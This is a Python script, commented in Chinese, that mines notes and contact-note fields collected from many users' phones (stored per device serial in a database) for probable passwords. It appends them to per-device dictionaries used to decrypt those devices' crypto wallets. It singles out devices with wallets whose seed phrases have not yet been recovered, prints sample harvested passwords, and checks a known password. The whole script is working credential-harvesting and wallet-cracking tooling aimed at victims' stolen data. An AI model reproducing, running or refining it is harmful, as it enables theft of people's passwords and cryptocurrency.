#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mine_device_passwords.py — 设备级密码候选挖掘（备忘录+联系人备注 → by_serial 定向字典）

原理：用户习惯把密码记在自己的备忘录/联系人备注里（实测真实格式如
  "密码：ky20081114Aaa" / "Password 0913" / 跨行 "支付宝登陆密码：\\nxxx"）。
  本脚本按【设备】聚合其文本，提取候选密码，追加写入
  adm888app/data/wallet_passwords.json 的 by_serial[serial]。
  ★ 设备级字典：设备 A 提取的候选只用于设备 A 自己的钱包解密（不跨设备）。
  ★ 全局 passwords 列表（通用弱口令）不受本脚本影响。

用法：
  python3 tools/mine_device_passwords.py --dry     # 干跑：只统计+样例，不写
  python3 tools/mine_device_passwords.py --apply   # 应用：append 写入 by_serial

安全：
  - 只 append（不覆盖/不删除已有条目）；重复运行幂等（去重）
  - 解密侧仍有 keystore MAC / GCM tag 校验（绝不误报）
  - 候选上限 100/设备（≈ 25 秒/台 的解密成本）
"""
import os, re, json, sys, time
import shutil
import psycopg2

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PW_FILE = os.path.join(BASE, 'adm888app', 'data', 'wallet_passwords.json')
LOG = os.path.join(BASE, 'logs', 'mine_device_passwords.log')
DRY = '--dry' in sys.argv
APPLY = '--apply' in sys.argv
MAX_PER_DEV = 100

KW_RE = re.compile(r'密码|密碼|口令|password|passwd|pwd|pin码|PIN|keystore', re.I)
TOKEN_L1 = re.compile(r'[A-Za-z0-9!@#$%^&*._+=\-]{3,128}')     # L1 语境（允许短串，如 "666"）
TOKEN_L2 = re.compile(r'[A-Za-z0-9!@#$%^&*._+=\-]{4,128}')     # L2 模式
NUM_RE = re.compile(r'^[0-9]{3,8}$')
MIX_RE = re.compile(r'^(?=.*[A-Za-z])(?=.*[0-9])[A-Za-z0-9!@#$%^&*._+=\-]{6,16}$')
URLISH_RE = re.compile(r'(^|\.)(com|cn|net|org|io|me|app|xyz|top|cc|tv|vip|club|site|online|space|shop|icu|live|fun)(/|$)', re.I)
EXT_RE = re.compile(r'\.(mp3|mp4|m4a|wav|jpg|jpeg|png|gif|heic|mov|avi|pdf|docx?|xlsx?|pptx?|zip|rar|7z|txt|html?|json|csv|apk|ipa|dylib|log|db|sqlite)$', re.I)
EMAIL_RE = re.compile(r'^[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$')
LOWERCASE_WORD_RE = re.compile(r'^[a-z]{1,6}$')
COMMON_NOISE = {'http', 'https', 'www', 'com', 'cn', 'email', 'password', 'passwd', 'gmail', 'qqcom', 'aliyun', 'wechat', 'telegram'}


def log(line):
    try:
        with open(LOG, 'a') as f:
            f.write(time.strftime('[%F %T] ') + line + '\n')
    except Exception:
        pass


def _clean(t, min_len=3):
    t = str(t or '').strip('._-+=')
    if len(t) < min_len or len(t) > 128:
        return None
    if URLISH_RE.search(t) or EMAIL_RE.match(t) or EXT_RE.search(t):
        return None
    if t.lower() in COMMON_NOISE:
        return None
    return t


def mine_text(text, seen, out, cap=MAX_PER_DEV):
    """L1 关键词语境（后向 80 字符窗口，含跨行）→ L2 密码模式"""
    if not text:
        return
    # ---- L1：关键词之后的窗口（真实密码多写在"密码/Password"之后）----
    for m in KW_RE.finditer(text):
        if len(out) >= cap:
            return
        seg = text[m.end(): m.end() + 80]
        for raw in TOKEN_L1.findall(seg):
            if len(out) >= cap:
                return
            t = _clean(raw, 3)
            if t and t not in seen:
                seen.add(t)
                out.append(t)
    # ---- L2：模式兜底（纯数字 3-8 位 / 字母+数字 6-16 位）----
    for raw in TOKEN_L2.findall(text):
        if len(out) >= cap:
            return
        t = _clean(raw, 4)
        if t and t not in seen and (NUM_RE.match(t) or MIX_RE.match(t)):
            seen.add(t)
            out.append(t)


def main():
    if not DRY and not APPLY:
        print('用法: python3 tools/mine_device_passwords.py --dry | --apply')
        return 1
    t0 = time.time()
    cfg = json.load(open(os.path.join(BASE, 'adm888app', 'data', 'pg.json')))
    conn = psycopg2.connect(host=cfg.get('host', '127.0.0.1'), port=int(cfg.get('port', 5432)),
                            user=cfg['user'], password=cfg['password'], dbname=cfg.get('database', 'panel'))
    conn.autocommit = False

    cand = {}   # serial -> {'seen':set,'out':[],'src':set}
    rows_note = 0
    # 1) 备忘录（独立命名游标：服务端流式，省内存）
    cur = conn.cursor('mine_ss1')
    cur.execute("SELECT serial, content FROM notebooks WHERE content IS NOT NULL AND length(content) >= 6")
    while True:
        batch = cur.fetchmany(2000)
        if not batch:
            break
        for serial, content in batch:
            rows_note += 1
            d = cand.get(serial)
            if d is None:
                d = cand[serial] = {'seen': set(), 'out': [], 'src': set()}
            before = len(d['out'])
            mine_text(content, d['seen'], d['out'])
            if len(d['out']) > before:
                d['src'].add('note')
    # 2) 联系人备注（独立命名游标）
    cur = conn.cursor('mine_ss2')
    cur.execute("SELECT serial, data->>'note' FROM contacts WHERE data->>'note' IS NOT NULL AND length(data->>'note') >= 6")
    rows_ct = 0
    while True:
        batch = cur.fetchmany(2000)
        if not batch:
            break
        for serial, note in batch:
            rows_ct += 1
            d = cand.get(serial)
            if d is None:
                d = cand[serial] = {'seen': set(), 'out': [], 'src': set()}
            before = len(d['out'])
            mine_text(note, d['seen'], d['out'])
            if len(d['out']) > before:
                d['src'].add('contact')
    conn.close()

    devs = {k: v for k, v in cand.items() if v['out']}
    total = sum(len(v['out']) for v in devs.values())
    elapsed = time.time() - t0

    # ---- 目标池交叉（有钱包且未解出助记词的设备）----
    cfg2 = cfg
    conn2 = psycopg2.connect(host=cfg2.get('host', '127.0.0.1'), port=int(cfg2.get('port', 5432)),
                             user=cfg2['user'], password=cfg2['password'], dbname=cfg2.get('database', 'panel'))
    cur2 = conn2.cursor()
    cur2.execute("SELECT serial FROM devices WHERE wallets IS NOT NULL AND array_length(wallets,1) > 0 AND mnemonic_count = 0")
    targets = set(r[0] for r in cur2.fetchall())
    conn2.close()
    hit_targets = [s for s in devs if s in targets]

    print('================= mine_device_passwords 报告 (%s) =================' % ('DRY' if DRY else 'APPLY'))
    print('扫描: 备忘录 %d 条 / 联系人备注 %d 条 | 耗时 %.1fs' % (rows_note, rows_ct, elapsed))
    print('有候选设备: %d 台 | 候选总数: %d | 平均 %.1f/台' % (len(devs), total, (total / len(devs)) if devs else 0))
    print('目标池(有钱包未解出): %d 台 | 其中本脚本覆盖: %d 台' % (len(targets), len(hit_targets)))
    src_note = sum(1 for v in devs.values() if 'note' in v['src'])
    src_ct = sum(1 for v in devs.values() if 'contact' in v['src'])
    print('来源分布: 备忘录 %d 台 / 联系人 %d 台' % (src_note, src_ct))

    top = sorted(devs.items(), key=lambda kv: -len(kv[1]['out']))[:15]
    print('\nTOP 15 设备（候选数 | 前 6 个候选样例）:')
    for s, v in top:
        sample = ', '.join(v['out'][:6])
        print('  %-14s %3d 个 | %s' % (s, len(v['out']), sample))

    # 已知密码回测（有则加分）
    known = ['aa147258']
    for s, v in devs.items():
        for k in known:
            if k in v['seen']:
                print('  [回测] 已知密码 %s 出现在设备 %s 的候选中' % (k, s))

    if APPLY:
        j = json.load(open(PW_FILE, encoding='utf-8'))
        bs = j.setdefault('by_serial', {})
        added = 0
        for s, v in devs.items():
            old = list(bs.get(s) or [])
            merged = old + [x for x in v['out'] if x not in old]
            if len(merged) != len(old):
                bs[s] = merged[:MAX_PER_DEV]
                added += 1
        # 备份 + 原子写入（防半写损坏 / 便于回滚）
        bk = PW_FILE + '.bak_mine_' + str(int(time.time()))
        shutil.copy2(PW_FILE, bk)
        tmp = PW_FILE + '.tmp_mine'
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(j, f, ensure_ascii=False, indent=1)
        os.replace(tmp, PW_FILE)
        print('\n[APPLY] by_serial 更新设备 %d 台（追加，不覆盖）| 备份: %s' % (added, bk))
        log('apply: devices=%d candidates=%d targets=%d backup=%s' % (len(devs), total, len(hit_targets), bk))
    else:
        print('\n[DRY] 未写任何数据。确认后执行 --apply')
    print('==================================================================')
    return 0


if __name__ == '__main__':
    sys.exit(main())
